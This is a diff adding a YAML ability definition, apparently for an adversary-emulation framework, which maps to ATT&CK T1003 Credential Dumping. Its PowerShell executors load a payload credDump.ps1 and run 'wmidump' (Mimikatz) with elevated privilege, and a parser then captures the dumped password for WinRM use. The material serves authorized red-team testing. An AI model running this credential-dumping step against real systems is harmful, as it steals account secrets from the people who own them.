@@ -1,0 +1,61 @@
+- tactic: credential-access
+  technique_name: Credential Dumping
+  technique_id: T1003
+  name: Credential Dumping
+  description: Dumping credentials via wmidump (Mimikatz)
+  executors:
+  - name: psh
+    platform: windows
+    command: '. .\credDump.ps1;
+
+      wmidump;'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - credDump.ps1
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.bountyhunter.app.parsers.wmidump
+      parserconfigs:
+      - source: target.winrm.password
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  - name: pwsh
+    platform: windows
+    command: '. .\credDump.ps1;
+
+      wmidump;'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - credDump.ps1
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.bountyhunter.app.parsers.wmidump
+      parserconfigs:
+      - source: target.winrm.password
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: Elevated
+  repeatable: false
+  buckets:
+  - credential-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: bountyhunter
+  delete_payload: false
+  id: a440211a-d2cc-4f89-a02d-a39061a0e697
